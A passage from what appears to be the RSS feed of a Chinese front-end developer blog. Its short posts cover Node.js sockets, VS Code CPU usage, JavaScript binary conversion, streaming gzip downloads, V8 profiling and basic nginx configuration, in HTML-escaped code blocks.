&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;end&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;policyFile&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;data&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;chunk&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Data received from client: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;chunk&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;()&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;end&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Closing connection with the client&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;socket&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`Error: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;err&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    });
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;});
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>为什么vscode会占用大量CPU资源？</title>
      <link>https://wdd.js.org/fe/vscode-high-cpu/</link>
      <pubDate>Sat, 29 Oct 2022 11:42:19 +0800</pubDate>
      <guid>https://wdd.js.org/fe/vscode-high-cpu/</guid>
      <description>&lt;p&gt;电脑的风扇声突然响了起来，我知道有某个进程在占用大量CPU资源。&lt;/p&gt;
&lt;p&gt;在任务管理器中，可以看到vscode占用的的CPU资源达到150。说明问题出在vscode上。&lt;/p&gt;
&lt;p&gt;在vscode中，按F1, 输入： show running extensions  可以查看所有插件的运行状况。&lt;/p&gt;
&lt;p&gt;其中需要关注最重要的指标就是活动时间：如果某个插件的活动时间明显是其他插件的好多倍，那问题就可能出在这个插件上。要么禁用该插件，要么卸载该插件。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/vscode-high-cpu/2022-10-29-11-42-53.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>js中二进制的操作</title>
      <link>https://wdd.js.org/fe/bin-number-operator/</link>
      <pubDate>Sat, 29 Oct 2022 11:41:13 +0800</pubDate>
      <guid>https://wdd.js.org/fe/bin-number-operator/</guid>
      <description>&lt;p&gt;js原生支持16进制、10进制、8进制的直接定义&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 十进制
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;var b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xee&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 十六进制, 238
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;var c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;013&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 八进制  11
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;十进制转二进制字符串&#34;&gt;十进制转二进制字符串&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var a &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;// 十进制
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;a.&lt;span style=&#34;color:#a6e22e&#34;&gt;toString&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#34;10101&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;二进制转10进制&#34;&gt;二进制转10进制&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;var d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10101&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;parseInt&lt;/span&gt;(&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10101&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;// 21
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>NodeJS边下载边解压gz文件</title>
      <link>https://wdd.js.org/fe/nodejs-stream-unzip/</link>
      <pubDate>Sat, 29 Oct 2022 11:39:37 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-stream-unzip/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;request&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zlib&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;zlib&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./log.js&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileType&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;endCount&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;module&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;exports&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Promise((&lt;span style=&#34;color:#a6e22e&#34;&gt;resolve&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;reject&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;request&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;get&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;url&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`下载失败&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;reject&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;error&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .&lt;span style=&#34;color:#a6e22e&#34;&gt;pipe&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;zlib&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createGunzip&lt;/span&gt;())
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .&lt;span style=&#34;color:#a6e22e&#34;&gt;pipe&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;createWriteStream&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileType&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .&lt;span style=&#34;color:#a6e22e&#34;&gt;on&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;finish&amp;#39;&lt;/span&gt;, (&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;) =&amp;gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;info&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;endCount&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; 完成下载 &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;item&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fileType&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#a6e22e&#34;&gt;resolve&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;res&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  })
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>V8 Profile</title>
      <link>https://wdd.js.org/fe/v8-profile/</link>
      <pubDate>Sat, 29 Oct 2022 11:37:55 +0800</pubDate>
      <guid>https://wdd.js.org/fe/v8-profile/</guid>
      <description>&lt;p&gt;下面的命令可以生成一个v8的日志如 isolate-0x102d4e000-86008-v8.log&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&amp;ndash;log-source-code 不是必传的字段，加了该字段可以在定位到源码&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;node --prof --log-source-code index.js
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;下一步是将log文件转成json&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;node --prof-process --preprocess isolate-0x102d4e000-86008-v8.log &amp;gt; v8.json
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后打开 &lt;a href=&#34;https://wangduanduan.gitee.io/v8-profiling/&#34;&gt;https://wangduanduan.gitee.io/v8-profiling/&lt;/a&gt;  这个页面，选择v8.json&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/v8-profile/2022-10-29-11-38-36.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;下图横坐标是时间，纵坐标是cpu百分比。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/v8-profile/2022-10-29-11-38-48.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;选择Bottom Up之后，展开JS unoptimized, 可以发现占用cpu比较高的代码的位置。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/v8-profile/2022-10-29-11-38-56.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>前端必会的nginx知识点</title>
      <link>https://wdd.js.org/fe/nginx-tips/</link>
      <pubDate>Sat, 29 Oct 2022 11:36:19 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nginx-tips/</guid>
      <description>&lt;h1 id=&#34;1-启动停止reload配置&#34;&gt;1. 启动？停止？reload配置&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx -s reload  &lt;span style=&#34;color:#75715e&#34;&gt;# 热重启&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx -s reopen  &lt;span style=&#34;color:#75715e&#34;&gt;# 重启Nginx&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx -s stop    &lt;span style=&#34;color:#75715e&#34;&gt;# 快速关闭&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx -s quit    &lt;span style=&#34;color:#75715e&#34;&gt;# 等待工作进程处理完成后关闭&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nginx -T         &lt;span style=&#34;color:#75715e&#34;&gt;# 查看配置文件的实际内容&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;2-nginx如何做反向http代理&#34;&gt;2. nginx如何做反向http代理&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /api &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	proxy_pass http://192.168.40.174:32020;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;3-nginx要如何配置才能处理跨域问题&#34;&gt;3. nginx要如何配置才能处理跨域问题&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /p/asm &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_pass http://192.168.40.174:32020;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Origin&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt; always;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Credentials&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;true&amp;#39;&lt;/span&gt; always;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Methods&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;GET,POST,PUT,DELETE,PATCH,OPTIONS&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Access-Control-Allow-Headers&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Content-Type,ssid&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;$request_method &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;OPTIONS&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; 204;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_redirect     off;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_set_header   Host $host;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;4-如何拦截某个请求直接返回某个状态码&#34;&gt;4. 如何拦截某个请求，直接返回某个状态码？&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /p/asm &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;OK&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
